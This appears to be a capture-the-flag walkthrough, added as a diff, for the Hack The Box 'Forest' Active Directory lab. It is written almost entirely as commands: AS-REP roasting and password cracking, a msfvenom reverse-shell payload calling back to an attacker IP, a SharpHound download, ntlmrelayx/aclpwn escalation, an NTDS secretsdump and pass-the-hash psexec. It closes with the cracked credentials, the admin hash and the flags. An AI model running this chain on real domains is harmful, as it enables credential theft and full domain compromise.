@@ -1,0 +1,52 @@
+nmap -> a lot of ports, vulnscan nothing
+
+Impacket samrdump [ ./samrdump.py 10.10.10.161 ]
+Users found: sebastien, lucinda, svc-alfresco, andy, mark, santi
+
+From the PasswordLastSet we might know that svc-alfresco IS OUR USER 
+
+Possible domains:
+HTB, Builtin
+
+Use the impacket tools [ python GetNPUsers.py HTB/ -dc-ip 10.10.10.161 -usersfile /root/Documents/Forest/users -no-pass -format john -outputfile hashes.asreproast ]
+
+Let's process the hash and get the password "s3rvice" with user svc-alfresco [ john --wordlist=/usr/share/wordlists/rockyou.txt /root/Documents/Forest/hashes.asreproast ]
+
+The response ( s3rvice -> $krb5asrep$svc-alfresco@HTB )
+
+Try these credentials on smbclient ( ./smbclient.py  svc-alfresco:s3rvice@10.10.10.161 ) 
+
+Got the USER. [ evil-winrm  -i 10.10.10.161 -u svc-alfresco -p s3rvice ]
+
+Heading to root
+
+Try to see what  accounts do we have [ GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/svc-alfresco ]
+Download the SharpHound.ps1 [ (New-Object System.Net.WebClient).DownloadFile("http://10.10.14.47:8000/SharpHound.ps1", "C:\Users\svc-alfresco\Documents\SharpHound.ps1") ]
+Create a reverse shell to switch to metasploit [ msfvenom -p payload/windows/meterpreter/reverse_tcp LHOST=10.10.14.47 LPORT=4444 -f exe > /root/Documents/shell.exe ] 
+Upload it to the host
+Setup metasploit's multi/host 
+Get the meterpreter 
+Enter the powershell [ execute -f powershell.exe -i -H ] 
+Import SharpHound.ps1 [ . .\SharpHound.ps1 ]
+Execute the file [ Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice ] 
+After you get this [ ./ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco ]
+Than run [ ./aclpwn.py -f svc-alfresco@htb.local -t htb.local -tt domain -du neo4j -dp Nadgob17 -d 10.10.10.161 ]
+And than secretdump [ ./secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -ntds ntds -history -just-dc-ntlm ] 
+Finally, just run the psexec from impacket and you root [ ./psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ]
+
+
+
+
+
+
+Users:
+-> svc-alfresco:s3rvice
+-> Adminsitrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+
+Flags
+USER -> e5e4e47ae7022664cda6eb013fb0d9ed
+ROOT -> f048153f202bbb2f82622b04d79129cc
+
+Article:
+https://chryzsh.github.io/exploiting-privexchange/
